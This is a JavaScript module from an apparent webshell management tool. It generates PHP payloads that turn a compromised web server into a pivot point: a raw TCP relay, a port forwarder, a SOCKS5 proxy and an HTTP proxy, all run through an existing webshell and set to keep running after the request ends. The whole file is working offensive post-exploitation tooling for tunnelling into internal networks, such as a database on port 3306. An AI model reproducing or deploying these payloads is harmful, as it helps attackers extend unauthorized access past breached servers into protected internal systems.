/**
 * Webshell TCP 正向代理模块 v2.0
 * 通过 Webshell 建立 TCP 隧道
 */

const WebshellProxy = (function() {
    // 代理状态
    let proxyState = {
        running: false,
        localPort: 1080,
        targetHost: '127.0.0.1',
        targetPort: 3306,
        connections: 0,
        bytesIn: 0,
        bytesOut: 0,
        logs: []
    };

    // 活跃连接
    let activeConnections = new Map();
    let connectionId = 0;

    // 添加日志
    function log(message, type = 'info') {
        const entry = {
            time: new Date().toLocaleTimeString(),
            message,
            type
        };
        proxyState.logs.unshift(entry);
        if (proxyState.logs.length > 100) {
            proxyState.logs.pop();
        }
    }

    // ==================== PHP 代理 Payload ====================

    // 单次请求代理 (适用于 HTTP/短连接)
    function buildSingleProxyPayload(targetHost, targetPort, data) {
        const base64Data = typeof data === 'string' ? btoa(data) : data;
        return `
$host = '${targetHost}';
$port = ${targetPort};
$data = base64_decode('${base64Data}');

$socket = @fsockopen($host, $port, $errno, $errstr, 10);
if (!$socket) {
    echo json_encode(array('error' => "Connection failed: $errstr ($errno)"));
    exit;
}

fwrite($socket, $data);

stream_set_timeout($socket, 5);
$response = '';
while (!feof($socket)) {
    $chunk = fread($socket, 8192);
    if ($chunk === false || strlen($chunk) === 0) break;
    $response .= $chunk;
}

fclose($socket);
echo json_encode(array('success' => true, 'data' => base64_encode($response)));
        `;
    }

    // 端口转发 Payload (在目标机器上监听)
    function buildPortForwardPayload(localPort, remoteHost, remotePort) {
        return `
set_time_limit(0);
ignore_user_abort(true);

$localPort = ${localPort};
$remoteHost = '${remoteHost}';
$remotePort = ${remotePort};

// 创建本地监听 socket
$localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if (!$localSocket) {
    die(json_encode(array('error' => 'Cannot create socket')));
}

if (!socket_bind($localSocket, '0.0.0.0', $localPort)) {
    die(json_encode(array('error' => 'Cannot bind port')));
}

if (!socket_listen($localSocket, 5)) {
    die(json_encode(array('error' => 'Cannot listen')));
}

socket_set_nonblock($localSocket);

echo json_encode(array('success' => true, 'message' => "Listening on port $localPort"));
flush();

$clients = array($localSocket);
$buffers = array();

while (true) {
    $read = $clients;
    $write = null;
    $except = null;

    if (socket_select($read, $write, $except, 0, 200000) < 1) {
        continue;
    }

    if (in_array($localSocket, $read)) {
        $client = socket_accept($localSocket);
        socket_set_nonblock($client);

        // 连接远程
        $remote = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_set_nonblock($remote);
        @socket_connect($remote, $remoteHost, $remotePort);

        $clients[] = $client;
        $clients[] = $remote;
        $buffers[$client] = '';
        $buffers[$remote] = '';

        unset($read[array_search($localSocket, $read)]);
    }

    foreach ($read as $sock) {
        $data = @socket_read($sock, 8192);
        if ($data === false || $data === '') {
            // 连接关闭
            $idx = array_search($sock, $clients);
            if ($idx !== false) {
                unset($clients[$idx]);
            }
            @socket_close($sock);
            unset($buffers[$sock]);
            continue;
        }

        // 找到对应的另一端 socket 并转发
        // 简化处理：找到配对
        foreach ($clients as $otherSock) {
            if ($otherSock !== $sock && $otherSock !== $localSocket) {
                @socket_write($otherSock, $data);
                break;
            }
        }
    }
}
        `;
    }

    // SOCKS5 代理 Payload
    function buildSocks5ProxyPayload(localPort) {
        return `
set_time_limit(0);
ignore_user_abort(true);

$port = ${localPort};
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock, 100);
socket_set_nonblock($sock);

echo json_encode(array('success' => true, 'message' => "SOCKS5 proxy started on port $port"));
flush();

$connections = array();

while (true) {
    $read = array_merge(array($sock), array_column($connections, 'client'), array_column($connections, 'remote'));
    $write = $except = null;

    if (@socket_select($read, $write, $except, 0, 100000) < 1) {
        continue;
    }

    // 新连接
    if (in_array($sock, $read)) {
        $client = socket_accept($sock);
        socket_set_nonblock($client);
        $connections[] = array(
            'client' => $client,
            'remote' => null,
            'state' => 'greeting',
            'buffer' => ''
        );
        unset($read[array_search($sock, $read)]);
    }

    // 处理现有连接
    foreach ($connections as $key => &$conn) {
        if (in_array($conn['client'], $read)) {
            $data = @socket_read($conn['client'], 8192);
            if ($data === false || $data === '') {
                @socket_close($conn['client']);
                if ($conn['remote']) @socket_close($conn['remote']);
                unset($connections[$key]);
                continue;
            }

            if ($conn['state'] === 'greeting') {
                // SOCKS5 握手响应
                socket_write($conn['client'], "\\x05\\x00");
                $conn['state'] = 'request';
            } elseif ($conn['state'] === 'request') {
                // 解析连接请求
                if (strlen($data) >= 10 && ord($data[0]) == 5 && ord($data[1]) == 1) {
                    $atype = ord($data[3]);
                    if ($atype == 1) {
                        // IPv4
                        $host = ord($data[4]) . '.' . ord($data[5]) . '.' . ord($data[6]) . '.' . ord($data[7]);
                        $port = (ord($data[8]) << 8) + ord($data[9]);
                    } elseif ($atype == 3) {
                        // Domain
                        $len = ord($data[4]);
                        $host = substr($data, 5, $len);
                        $port = (ord($data[5 + $len]) << 8) + ord($data[6 + $len]);
                    } else {
                        continue;
                    }

                    $remote = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                    socket_set_nonblock($remote);
                    @socket_connect($remote, $host, $port);

                    $conn['remote'] = $remote;
                    $conn['state'] = 'connected';
                    $conn['target'] = "$host:$port";

                    // 发送成功响应
                    $resp = "\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00";
                    socket_write($conn['client'], $resp);
                }
            } elseif ($conn['state'] === 'connected' && $conn['remote']) {
                socket_write($conn['remote'], $data);
            }
        }

        if ($conn['remote'] && in_array($conn['remote'], $read)) {
            $data = @socket_read($conn['remote'], 8192);
            if ($data === false || $data === '') {
                @socket_close($conn['client']);
                @socket_close($conn['remote']);
                unset($connections[$key]);
                continue;
            }
            socket_write($conn['client'], $data);
        }
    }
}
        `;
    }

    // HTTP 代理 Payload (支持 CONNECT 方法)
    function buildHttpProxyPayload(localPort) {
        return `
set_time_limit(0);
ignore_user_abort(true);

$port = ${localPort};
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock, 100);
socket_set_nonblock($sock);

echo json_encode(array('success' => true, 'message' => "HTTP proxy started on port $port"));
flush();

$clients = array($sock);

while (true) {
    $read = $clients;
    $write = $except = null;

    if (@socket_select($read, $write, $except, 0, 100000) < 1) {
        continue;
    }

    foreach ($read as $key => $client) {
        if ($client === $sock) {
            $newClient = socket_accept($sock);
            socket_set_nonblock($newClient);
            $clients[] = $newClient;
            continue;
        }

        $data = @socket_read($client, 8192);
        if ($data === false || $data === '') {
            @socket_close($client);
            unset($clients[$key]);
            continue;
        }

        // 解析 HTTP 请求
        $lines = explode("\\r\\n", $data);
        $firstLine = $lines[0];
        $parts = explode(' ', $firstLine);

        if (count($parts) >= 2) {
            $method = $parts[0];
            $url = $parts[1];

            if ($method === 'CONNECT') {
                // HTTPS 隧道
                $target = explode(':', $url);
                $host = $target[0];
                $port = isset($target[1]) ? (int)$target[1] : 443;

                $remote = @fsockopen($host, $port, $errno, $errstr, 10);
                if ($remote) {
                    socket_write($client, "HTTP/1.1 200 Connection Established\\r\\n\\r\\n");
                    stream_set_blocking($remote, 0);
                    socket_set_nonblock($client);

                    // 双向转发 (简化版)
                    // 实际需要更复杂的非阻塞 I/O
                } else {
                    socket_write($client, "HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n");
                    @socket_close($client);
                    unset($clients[$key]);
                }
            } else {
                // 普通 HTTP 请求
                $urlParts = parse_url($url);
                $host = $urlParts['host'] ?? '';
                $port = $urlParts['port'] ?? 80;
                $path = ($urlParts['path'] ?? '/') . (isset($urlParts['query']) ? '?' . $urlParts['query'] : '');

                $remote = @fsockopen($host, $port, $errno, $errstr, 10);
                if ($remote) {
                    // 重写请求
                    $newRequest = "$method $path HTTP/1.1\\r\\n";
                    foreach (array_slice($lines, 1) as $line) {
                        if ($line === '') break;
                        if (!preg_match('/^Proxy-/', $line)) {
                            $newRequest .= $line . "\\r\\n";
                        }
                    }
                    $newRequest .= "Connection: close\\r\\n\\r\\n";

                    fwrite($remote, $newRequest);
                    stream_set_timeout($remote, 30);

                    while (!feof($remote)) {
                        $chunk = fread($remote, 8192);
                        if ($chunk === false || $chunk === '') break;
                        socket_write($client, $chunk);
                    }

                    fclose($remote);
                    @socket_close($client);
                    unset($clients[$key]);
                }
            }
        }
    }
}
        `;
    }

    // ==================== 代理操作 ====================

    // 发送单次代理请求
    async function sendProxyRequest(shell, targetHost, targetPort, data) {
        const payload = buildSingleProxyPayload(targetHost, targetPort, data);

        try {
            const result = await WebshellCore.sendRequest(shell, payload);
            if (result.success) {
                const response = JSON.parse(result.data);
                if (response.success) {
                    proxyState.bytesIn += data.length;
                    proxyState.bytesOut += response.data.length;
                    proxyState.connections++;
                    return {
                        success: true,
                        data: atob(response.data)
                    };
                }
                return {
                    success: false,
                    error: response.error || 'Proxy request failed'
                };
            }
            return {
                success: false,
                error: result.error
            };
        } catch (e) {
            return {
                success: false,
                error: e.message
            };
        }
    }

    // 启动端口转发 (在目标机器上)
    async function startPortForward(shell, localPort, remoteHost, remotePort) {
        const payload = buildPortForwardPayload(localPort, remoteHost, remotePort);

        proxyState.running = true;
        proxyState.localPort = localPort;
        proxyState.targetHost = remoteHost;
        proxyState.targetPort = remotePort;

        log(`启动端口转发: ${localPort} -> ${remoteHost}:${remotePort}`, 'info');

        try {
            const result = await WebshellCore.sendRequest(shell, payload);
            if (result.success) {
                const response = JSON.parse(result.data);
                if (response.success) {
                    log(response.message, 'success');
                    return { success: true, message: response.message };
                }
                log(response.error, 'error');
                return { success: false, error: response.error };
            }
            return { success: false, error: result.error };
        } catch (e) {
            log(`启动失败: ${e.message}`, 'error');
            return { success: false, error: e.message };
        }
    }

    // 启动 SOCKS5 代理
    async function startSocks5Proxy(shell, localPort) {
        const payload = buildSocks5ProxyPayload(localPort);

        proxyState.running = true;
        proxyState.localPort = localPort;
        proxyState.targetHost = 'dynamic';
        proxyState.targetPort = 0;

        log(`启动 SOCKS5 代理: 端口 ${localPort}`, 'info');

        try {
            const result = await WebshellCore.sendRequest(shell, payload);
            if (result.success) {
                try {
                    const response = JSON.parse(result.data);
                    if (response.success) {
                        log(response.message, 'success');
                        return { success: true, message: response.message };
                    }
                    log(response.error, 'error');
                    return { success: false, error: response.error };
                } catch (e) {
                    // 可能已经开始运行
                    log('代理已启动 (无法解析响应)', 'warning');
                    return { success: true, message: 'Proxy started' };
                }
            }
            return { success: false, error: result.error };
        } catch (e) {
            log(`启动失败: ${e.message}`, 'error');
            return { success: false, error: e.message };
        }
    }

    // 启动 HTTP 代理
    async function startHttpProxy(shell, localPort) {
        const payload = buildHttpProxyPayload(localPort);

        proxyState.running = true;
        proxyState.localPort = localPort;

        log(`启动 HTTP 代理: 端口 ${localPort}`, 'info');

        try {
            const result = await WebshellCore.sendRequest(shell, payload);
            if (result.success) {
                try {
                    const response = JSON.parse(result.data);
                    if (response.success) {
                        log(response.message, 'success');
                        return { success: true, message: response.message };
                    }
                    return { success: false, error: response.error };
                } catch (e) {
                    log('代理已启动', 'warning');
                    return { success: true, message: 'Proxy started' };
                }
            }
            return { success: false, error: result.error };
        } catch (e) {
            log(`启动失败: ${e.message}`, 'error');
            return { success: false, error: e.message };
        }
    }

    // 停止代理
    function stopProxy() {
        proxyState.running = false;
        activeConnections.clear();
        log('代理已停止', 'info');
        return { success: true };
    }

    // 获取状态
    function getStatus() {
        return {
            ...proxyState,
            activeConnections: activeConnections.size
        };
    }

    // 获取日志
    function getLogs() {
        return proxyState.logs;
    }

    // 清空日志
    function clearLogs() {
        proxyState.logs = [];
    }

    // HTTP 请求代理 (便捷方法)
    async function httpProxy(shell, method, url, headers = {}, body = '') {
        try {
            const urlObj = new URL(url);
            const host = urlObj.hostname;
            const port = urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80);
            const path = urlObj.pathname + urlObj.search;

            let request = `${method} ${path} HTTP/1.1\r\n`;
            request += `Host: ${host}\r\n`;
            request += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n`;
            request += `Accept: */*\r\n`;

            for (const [key, value] of Object.entries(headers)) {
                request += `${key}: ${value}\r\n`;
            }

            if (body) {
                request += `Content-Length: ${body.length}\r\n`;
            }

            request += `Connection: close\r\n`;
            request += `\r\n`;
            request += body;

            const result = await sendProxyRequest(shell, host, port, request);

            if (result.success) {
                return parseHttpResponse(result.data);
            }
            return result;
        } catch (e) {
            return { success: false, error: e.message };
        }
    }

    // 解析 HTTP 响应
    function parseHttpResponse(raw) {
        const headerEnd = raw.indexOf('\r\n\r\n');
        if (headerEnd === -1) {
            return { success: false, error: 'Invalid HTTP response' };
        }

        const headerPart = raw.substring(0, headerEnd);
        const body = raw.substring(headerEnd + 4);

        const lines = headerPart.split('\r\n');
        const statusLine = lines[0];
        const statusMatch = statusLine.match(/HTTP\/[\d.]+\s+(\d+)\s*(.*)/);

        const status = statusMatch ? parseInt(statusMatch[1]) : 0;
        const statusText = statusMatch ? statusMatch[2] : '';

        const headers = {};
        for (let i = 1; i < lines.length; i++) {
            const colonIndex = lines[i].indexOf(':');
            if (colonIndex > 0) {
                const key = lines[i].substring(0, colonIndex).trim().toLowerCase();
                const value = lines[i].substring(colonIndex + 1).trim();
                headers[key] = value;
            }
        }

        return {
            success: true,
            status,
            statusText,
            headers,
            body
        };
    }

    // 公开 API
    return {
        // Payload 构建
        buildSingleProxyPayload,
        buildPortForwardPayload,
        buildSocks5ProxyPayload,
        buildHttpProxyPayload,

        // 代理操作
        sendProxyRequest,
        startPortForward,
        startSocks5Proxy,
        startHttpProxy,
        stopProxy,

        // HTTP 代理
        httpProxy,
        parseHttpResponse,

        // 状态
        getStatus,
        getLogs,
        clearLogs
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellProxy;
}
